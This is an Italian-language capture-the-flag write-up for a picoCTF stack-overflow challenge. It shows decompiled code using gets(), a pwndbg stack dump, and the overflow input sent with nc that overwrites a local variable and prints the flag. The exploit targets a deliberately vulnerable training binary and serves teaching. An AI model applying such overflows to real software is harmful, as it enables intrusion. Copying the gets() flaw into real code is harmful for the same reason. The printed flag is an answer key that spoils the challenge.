@@ -1,0 +1,121 @@
+00401236    int32_t main(int32_t argc, char** argv, char** envp)
+
+00401236    {
+00401236        int32_t var_10 = 0x40;
+00401255        printf("Enter a string: ");
+00401264        fflush(__TMC_END__);
+00401275        char buf[0x10];
+00401275        gets(&buf);
+0040127f        putchar(0xa);
+00401295        printf("num is %d\n", (uint64_t)var_10);
+004012a4        fflush(__TMC_END__);
+004012a4        
+004012ad        if (var_10 != 0x41)
+004012ad        {
+00401387            puts("Bye!");
+00401396            fflush(__TMC_END__);
+004013a1            return 0;
+004012ad        }
+004012ad        
+004012ba        puts("You win!");
+004012c9        fflush(__TMC_END__);
+004012dc        FILE* fp = fopen("flag.txt", "r");
+004012dc        
+004012ea        if (!fp)
+004012ea        {
+0040131d            puts("Cannot open file.");
+00401302            fflush(__TMC_END__);
+0040130c            exit(0);
+0040130c            /* no return */
+004012ea        }
+004012ea        
+00401340        for (char i = fgetc(fp); i != 0xff; i = fgetc(fp))
+00401340            putchar((int32_t)i);
+00401340        
+0040134c        fflush(__TMC_END__);
+00401356        putchar(0xa);
+00401365        fflush(__TMC_END__);
+00401371        fclose(fp);
+0040137b        exit(0);
+0040137b        /* no return */
+00401236    }
+------- noto per prima cosa questo controllo: if (var_10 != 0x41)
+
+esso verifica che var_10 sia uguale a "A"
+
+provo ad inserire un pattern generato con cyclic aaaaaaaabaaaaaaacaaaaaaadaaaaaaa
+
+----
+pwndbg> run
+Starting program: /app/local-target
+[Thread debugging using libthread_db enabled]
+Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
+Enter a string: aaaaaaaabaaaaaaacaaaaaaadaaaaaaa
+
+num is 1633771876
+
+Breakpoint 1, 0x00000000004012a4 in main ()
+LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
+──────────────────────────────────────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]──────────────────────────────────────────────────────
+ RAX  0x7ffff7fa9780 (_IO_2_1_stdout_) ◂— 0xfbad2a84
+ RBX  0
+ RCX  1
+ RDX  0
+ RDI  0x7ffff7fa9780 (_IO_2_1_stdout_) ◂— 0xfbad2a84
+ RSI  0x4052a0 ◂— 'num is 1633771876\n'
+ R8   0
+ R9   0x7fffffffe44e ◂— '1633771876'
+ R10  0
+ R11  0x246
+ R12  0x7fffffffe6b8 —▸ 0x7fffffffe8d0 ◂— '/app/local-target'
+ R13  0x401236 (main) ◂— endbr64
+ R14  0
+ R15  0x7ffff7ffd040 (_rtld_global) —▸ 0x7ffff7ffe2e0 ◂— 0
+ RBP  0x7fffffffe5a0 ◂— 0
+ RSP  0x7fffffffe580 ◂— 'aaaaaaaabaaaaaaacaaaaaaadaaaaaaa'
+ RIP  0x4012a4 (main+110) ◂— call fflush@plt
+───────────────────────────────────────────────────────────────[ DISASM / x86-64 / set emulate on ]───────────────────────────────────────────────────────────────
+ ► 0x4012a4 <main+110>    call   fflush@plt                  <fflush@plt>
+        stream: 0x7ffff7fa9780 (_IO_2_1_stdout_) ◂— 0xfbad2a84
+
+   0x4012a9 <main+115>    cmp    dword ptr [rbp - 8], 0x41
+   0x4012ad <main+119>    jne    main+330                    <main+330>
+
+   0x4012b3 <main+125>    lea    rdi, [rip + 0xd66]            RDI => 0x402020 ◂— 'You win!'
+   0x4012ba <main+132>    call   puts@plt                    <puts@plt>
+
+   0x4012bf <main+137>    mov    rax, qword ptr [rip + 0x2daa]     RAX, [stdout@@GLIBC_2.2.5]
+   0x4012c6 <main+144>    mov    rdi, rax
+   0x4012c9 <main+147>    call   fflush@plt                  <fflush@plt>
+
+   0x4012ce <main+152>    lea    rsi, [rip + 0xd54]                RSI => 0x402029 ◂— 0x742e67616c660072 /* 'r' */
+   0x4012d5 <main+159>    lea    rdi, [rip + 0xd4f]                RDI => 0x40202b ◂— 'flag.txt'
+   0x4012dc <main+166>    call   fopen@plt                   <fopen@plt>
+────────────────────────────────────────────────────────────────────────────[ STACK ]─────────────────────────────────────────────────────────────────────────────
+00:0000│ rsp 0x7fffffffe580 ◂— 'aaaaaaaabaaaaaaacaaaaaaadaaaaaaa'
+01:0008│-018 0x7fffffffe588 ◂— 'baaaaaaacaaaaaaadaaaaaaa'
+02:0010│-010 0x7fffffffe590 ◂— 'caaaaaaadaaaaaaa'
+03:0018│-008 0x7fffffffe598 ◂— 'daaaaaaa'
+04:0020│ rbp 0x7fffffffe5a0 ◂— 0
+05:0028│+008 0x7fffffffe5a8 —▸ 0x7ffff7db7d90 (__libc_start_call_main+128) ◂— mov edi, eax
+06:0030│+010 0x7fffffffe5b0 ◂— 0
+07:0038│+018 0x7fffffffe5b8 —▸ 0x401236 (main) ◂— endbr64
+──────────────────────────────────────────────────────────────────────────[ BACKTRACE ]───────────────────────────────────────────────────────────────────────────
+ ► 0         0x4012a4 main+110
+   1   0x7ffff7db7d90 __libc_start_call_main+128
+   2   0x7ffff7db7e40 __libc_start_main+128
+   3         0x40117e _start+46
+──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+
+vedo che la var_10 è stata sovrascritta, infatti il programma stesso mi dice che num è 1633771876 e non più 64
+
+cerco nello stack la var_10: è 0x7fffffffe598 (che ha come prima lettera la d)
+
+reinserisco dunque la pattern string fino alla d e poi inserisco la A che il programma vuole per quel controllo:
+
+nc saturn.picoctf.net 53856                                                                                                                                 ─╯
+Enter a string: aaaaaaaabaaaaaaacaaaaaaaA
+
+num is 65
+You win!
+picoCTF{l0c4l5_1n_5c0p3_fee8ef05}
